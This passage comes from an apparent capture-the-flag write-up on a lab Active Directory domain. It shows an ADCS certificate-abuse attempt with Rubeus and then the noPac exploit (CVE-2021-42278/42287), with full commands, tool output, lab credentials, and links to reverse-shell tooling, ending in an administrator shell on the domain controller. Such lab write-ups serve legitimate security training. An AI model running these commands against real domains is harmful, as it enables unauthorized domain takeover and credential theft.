+Instructs the script to use the default CSP during enrollment. This will result in the certificate being stored in the default user cert store and not on a smartcard.
+Use this if you have no smartcard or just want a PoC.
+```
+6) Our payload will be as follows:
+```bash
+PS C:\Windows\Temp\PrivEsc> Get-SmartcardCertificate -Identity Administrator -TemplateName WEB -NoSmartcard -Verbose
+```
+7) We can check the certificates generated with the following command: ^3fe8c0
+```bash
+gci cert:\currentuser\my -verbose
+   PSParentPath: Microsoft.PowerShell.Security\Certificate::currentuser\my
+
+Thumbprint                                Subject
+----------                                -------
+95E99117088DD7F691848064CC95E3F4E03E2C9C
+```
+8) Then we can get an NT hash with rubeus using the SmartCard functionality:
+```bash
+PS C:\Windows\Temp\PrivEsc> .\Rubeus.exe asktgt /user:Administrator /certificate:95E99117088DD7F691848064CC95E3F4E03E2C9C /getcredentials
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject:
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'windcorp.htb\Administrator'
+[*] Using domain controller: fe80::fd41:17c:daf0:a163%12:88
+
+[X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP
+```
+But that doesn't seems to be working, so let's try to find another way, we found the following article that explains some vulnerabilities that lead to an interactive shell with the administrator user [CVE-2021-42278](https://www.fortinet.com/blog/threat-research/cve-2021-42278-cve-2021-42287-from-user-to-domain-admin-60-seconds) if we search for a [github](https://github.com/Ridter/noPac) we find this NoPAC repository so let's try to use it by first download it:
+```bash
+# First download it:
+git clone https://github.com/Ridter/noPac.git
+# Then install requirements:
+pip install -r requirements.txt
+# Then execute the script as follows:
+proxychains python3 scanner.py windcorp.htb/localadmin:Secret123 -dc-ip 172.18.224.1
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+
+███    ██  ██████  ██████   █████   ██████ 
+████   ██ ██    ██ ██   ██ ██   ██ ██      
+██ ██  ██ ██    ██ ██████  ███████ ██      
+██  ██ ██ ██    ██ ██      ██   ██ ██      
+██   ████  ██████  ██      ██   ██  ██████ 
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.18.224.1:636  ...  OK
+[*] Current ms-DS-MachineAccountQuota = 10
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.18.224.1:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.18.224.1:88  ...  OK
+[-] Error getting TGT, Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+```
+As we can see from the output, the thing is the sync of the NTP protocol with the domain, that must be exactly as it so we run this commands to synchronize it: ^bcaafb
+```bash
+# Move the timezone to GMT:
+timedatectl set-timezone 'GMT'
+# Get and synchronize the hour in real time:
+date -s "$(curl -s -k -I https://www.windcorp.htb | grep date | cut -d " " -f2- | tr -d ',')"
+
+Fri Feb  3 10:57:56 AM GMT 2023
+# Be sure that it is indeed working:
+curl -s -k -I https://www.windcorp.htb | grep date | cut -d " " -f2- | tr -d ','            
+
+Fri 03 Feb 2023 10:57:59 GMT
+```
+If both times are sync then the previous command should be working:
+```bash
+proxychains python3 scanner.py windcorp.htb/localadmin:Secret123 -dc-ip 172.18.224.1         
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+
+███    ██  ██████  ██████   █████   ██████ 
+████   ██ ██    ██ ██   ██ ██   ██ ██      
+██ ██  ██ ██    ██ ██████  ███████ ██      
+██  ██ ██ ██    ██ ██      ██   ██ ██      
+██   ████  ██████  ██      ██   ██  ██████ 
+                                           
+                                        
+    
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.18.224.1:636  ...  OK
+[*] Current ms-DS-MachineAccountQuota = 10
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.18.224.1:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.18.224.1:88  ...  OK
+[*] Got TGT with PAC from 172.18.224.1. Ticket size 1479
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.18.224.1:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.18.224.1:88  ...  OK
+[*] Got TGT from 172.18.224.1. Ticket size 715
+```
+And yes it is, so let's get our interactive shell:
+```bash
+proxychains python3 noPac.py windcorp.htb/localadmin:Secret123 -dc-ip 172.18.224.1 -dc-host earth -shell --impersonate administrator
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>
+
+```
+
+# Credentials
+```bash
+localadmin:Secret123
+```
+
+# Resources:
+[Nishang Powershell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) 
+[chisel](https://github.com/jpillora/chisel/releases)
+[SharpCollections Suite](https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.5_Any) 
+[ADCS.ps1](https://raw.githubusercontent.com/cfalta/PoshADCS/master/ADCS.ps1)
+[PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)
+[CVE-2021-42278](https://www.fortinet.com/blog/threat-research/cve-2021-42278-cve-2021-42287-from-user-to-domain-admin-60-seconds)
+[github](https://github.com/Ridter/noPac) 
+[ASP SSTI RCE Payload](https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html)
